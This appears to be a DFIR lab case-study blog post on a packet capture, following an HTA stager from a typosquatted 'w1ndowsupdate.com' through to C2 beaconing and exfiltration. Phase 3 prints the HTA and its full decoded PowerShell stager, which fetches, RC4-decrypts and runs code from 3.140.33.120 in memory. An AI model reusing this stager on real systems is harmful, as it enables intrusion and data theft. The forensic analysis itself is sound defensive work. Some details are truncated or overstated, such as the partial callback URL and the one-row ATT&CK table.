---
layout: post
title: "Bluecape DFIR Case Study"
author: Alex Maina Weru
date: 2026-10-06
categories: [DFIR Fundamentals, PCAP Analysis]
tags: [DFIR, Threat, Management]
image:
  path: assets/threat/threat.svg
  alt: threat
---

> # DFIR Case Study: Network Traffic Analysis, Stager Deobfuscation, and C2 Profiling

## Executive Summary
On **August 30, 2024, at 22:56:20 UTC**, the Security Operations Center (SOC) detected a suspicious file download on a Windows workstation designated as **CLIENT2** (IP: `192.168.0.104`) belonging to an employee named **Alice**. The user downloaded a malicious HTML Application (HTA) stager named `update.exe.hta` from a typosquatted domain masquerading as a legitimate Windows service (`w1ndowsupdate.com`).

This technical write-up documents the deep-dive packet capture (PCAP) analysis, extraction of the malicious stager, sequential code deobfuscation using CyberChef, and behavioral profiling of the adversary's secondary Command and Control (C2) infrastructure. 

---

## Environment & Scope of Investigation
To maintain operational integrity, the forensic boundaries were strictly scoped to the following assets and parameters:
*   **In-Scope Host:** Workstation CLIENT2 (`192.168.0.104`)
*   **Target Account:** `alice`
*   **Timeframe Window:** August 30, 2024, 22:50:27 UTC onwards
*   **Internal Reference Infrastructure:**
    *   `192.168.0.10` — DC1 (Domain Controller / DNS Server)
    *   `192.168.0.1` — Gateway / Splunk Logging Server
*   **Defensive Baseline:** No antivirus, EDR, or local endpoint security tools were active on the host by default.

---

## Phase 1: Traffic Baseline & Protocol Hierarchy Analysis
Using Wireshark, an initial statistical baseline was established to filter normal network noise from malicious structural indicators.

### 1. Protocol Hierarchy Audit
The protocol distribution check showed that **99.8%** of all network packets traversed IPv4. The dominant traffic distribution consisted of:
*   **Transmission Control Protocol (TCP):** 94.9% of packets
*   **Transport Layer Security (TLSv1.2):** 18.4% of packets (representing encrypted application traffic)
*   **Hypertext Transfer Protocol (HTTP):** 6.2% of packets (cleartext application traffic)
*   **Domain Name System (DNS):** 0.8% of packets

### 2. Identifying Noisy Conversations
Sorting conversations on the IPv4 layer by packet volume immediately isolated an external anomaly. Workstation `192.168.0.104` was communicating heavily with an external IP address, **`3.140.33.120`**, across multiple non-standard ports. This IP address accounted for the vast majority of the outbound bandwidth, making it the primary focal point of the investigation.

---
![](/assets/pcap/p0.png)

![](/assets/pcap/p1.png)

![](/assets/pcap/p2.png)

![](/assets/pcap/p3.png)

![](/assets/pcap/p4.png)

## Phase 2: Entry Vector & Stager Delivery Analysis

### 1. DNS Resolution Tracking
Applying the filter `dns.qry.name contains "w1ndowsupdate.com"` revealed the initial lookup sequence routed from CLIENT2 to the Domain Controller (`192.168.0.10`). 

*   **Standard Query:** CLIENT2 requested the A record for `w1ndowsupdate.com`.
*   **DNS Response:** DC1 resolved the typosquatted domain directly to the external malicious IP address **`3.140.33.120`**.

*Forensic Note: The use of a '1' instead of an 'i' in `w1ndowsupdate.com` is a classic typosquatting technique designed to deceive end-users checking browser tabs or logs casually.*
![](/assets/pcap/p5.png)

![](/assets/pcap/p6.png)

### 2. HTTP Handshake and Directory Listing
An unencrypted HTTP connection was established with the malicious IP on port `8000`. The initial request was a `GET` directed to the root directory:

```http
GET / HTTP/1.1
Host: w1ndowsupdate.com:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
```

The adversary's staging server responded with an HTTP **200 OK**, delivering an index page with a raw directory listing exposing two primary payloads: `update.exe` and `update.exe.hta`. Crucially, the response header revealed a default development environment signature: `Server: SimpleHTTP/0.6 Python/3.11.9`. This indicated a lightweight, ad-hoc Python file-delivery server rather than a legitimate enterprise infrastructure.

At timestamp **22:56:17 UTC**, Alice's browser requested the specific HTA stager via `GET /update.exe.hta`, resulting in a payload delivery of **2,898 bytes** with a `Content-type: application/hta` header.


---
![](/assets/pcap/p7.png)

![](/assets/pcap/p8.png)

![](/assets/pcap/p9.png)

![](/assets/pcap/p10.png)

![](/assets/pcap/p11.png)

## Phase 3: Code Extraction & Multi-Stage Deobfuscation

To understand the payload's intent, the file `update.exe.hta` was carved out of the PCAP stream via Wireshark's **Export Objects -> HTTP** functionality.

### Step 1: Static Code Review
Opening the harvested stager in a text editor revealed an inline Microsoft script block utilizing an ActiveX object container to interact directly with the underlying OS shell:

```html
<html><head><script>
var c= 'powershell -noP -sta -w 1 -enc SQBmACgA...[TRUNCATED BASE64 BLOB]...'
new ActiveXObject('WScript.Shell').Run(c);
</script></head><body><script>self.close();</script></body></html>
```
![](/assets/pcap/p12.png)



**Evasion Analysis:** 
*   `-noP` (NoProfile): Prevents PowerShell from loading profile configurations, reducing execution overhead and footprint.
*   `-w 1` (WindowStyle Hidden): Attempts to hide the PowerShell execution console from the user's desktop view immediately upon execution.
*   `-enc` (EncodedCommand): Feeds a heavily encoded Base64 block to bypass simple string-matching network filters.

### Step 2: Phase 1 Deobfuscation (CyberChef)
The extracted Base64 payload string was imported into **CyberChef**. Applying the `From Base64` recipe and stripping away embedded null bytes revealed the cleartext PowerShell stager routine:

```powershell
If ($PSVersionTable.PSVersion.Major -ge 3) {};
[System.Net.ServicePointManager]::Expect100Continue = 0;
$wc = New-Object System.Net.WebClient;
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$ser = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAzAC4AMQA0ADAALgAzADMALgAxADIAMAA6ADkAMAAwADEA')));
$t = '/login/process.php';
$wc.Headers.Add('User-Agent', $u);
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$Script:Proxy = $wc.Proxy;
$K = [System.Text.Encoding]::ASCII.GetBytes('!hz%2x6mtC0AeYV,5Wju84/[snLaXH_D');
$R = {
    $D, $K = $Args; $S = 0..255;
    0..255|% {$J = ($J + $S[$_] + $K[$_%$K.Count])%256; $S[$_], $S[$J] = $S[$J], $S[$_]};
    $D|% {$I = ($I + 1)%256; $H = ($H + $S[$I])%256; $S[$I], $S[$H] = $S[$H], $S[$I]; $_ -bxor $S[($S[$I] + $S[$H])%256]}
};
$wc.Headers.Add("Cookie", "MbQrWboBJij=v2/3voIg4rUQ+JdKIqTSWsTshLk=");
$data = $wc.DownloadData($ser + $t);
$iv = $data[0..3];
$data = $data[4..$data.length];
-join[Char[]](& $R $data ($IV + $K))|IEX
```
![](/assets/pcap/p13.png)

![](/assets/pcap/p14.png)

### Step 3: Phase 2 Deobfuscation (C2 Infrastructure Mapping)
The cleartext script contained an inner Base64 string assigned to the `$ser` server variable. Passing `aAB0AHQAcAA6AC8ALwAzAC4AMQA0ADAALgAzADMALgAxADIAMAA6ADkAMAAwADEA` through CyberChef exposed the secondary callback address:

*   **Resolved Secondary Callout URL:** `http://3.140.33.120:9001`

**Stager Mechanism Insights:**
The `update.exe.hta` file functions as a classic fileless memory stager. When Alice opened it, the code instantiated a `WebClient` object, spoofed a legacy Internet Explorer User-Agent string (`Trident/7.0`), appended a hardcoded session tracking Cookie value, and targeted `http://3.140.33`. 

The block labeled `$R` contains an implementation of the **RC4 Stream Cipher** algorithm. The script pulls an encrypted binary down into local memory, uses the hardcoded key token `!hz%2x6mtC0AeYV,5Wju84/[snLaXH_D` mixed with a 4-byte Initialization Vector (`$iv`) to decrypt the stream, and hooks it directly into the PowerShell core expression engine via `|IEX` (Invoke-Expression). This ensures the true final implant is never written directly to the host's physical hard drive, effectively evading standard file-system scanners.

---
![](/assets/pcap/p15.png)

## Phase 4: Command & Control (C2) Profiling & Exfiltration

Following successful stage-2 execution, traffic patterns transformed significantly. The host process began executing outbound polling connections at regular intervals, reaching out to distinct application tracking points on the C2 node:
*   `GET /login/process.php`
*   `GET /news.php`
*   `GET /admin/get.php`

This steady, predictable polling behavior strongly profiles a persistent interactive memory agent (such as an Empire or Cobalt Strike beacon clone) checking in to receive arbitrary administrative instructions.

![](/assets/pcap/p16.png)

### Data Exfiltration Verification
To evaluate the impact of this beaconing, an I/O traffic distribution graph was generated in Wireshark, filtering strictly on the secondary data port channels (`ip.dst == 3.140.33.120 && tcp.dstport == 9003`). 

The I/O analysis identified severe, concentrated spike behaviors. A single continuous TCP stream accounted for a massive transfer of **2,860 packets**, translating to a raw bulk data upload of approximately **4 MB** directly to the threat actor's storage listener. Given the automated, bursty nature of the network packets, this confirms a **successful data exfiltration event** extracting high-value system parameters, password hashes, or active files from Alice's profile directory.

---
![](/assets/pcap/p17.png)
## MITRE ATT&CK Matrix Mapping

| Tactic | Technique ID | Technique Name | Context / Observed Evidence |
| :--- | :--- | :--- | :--- |
| **Initial Access** | T1566.002 | Spearphishing: Malicious Link | User navigated to a typosquatted staging link over the web. |
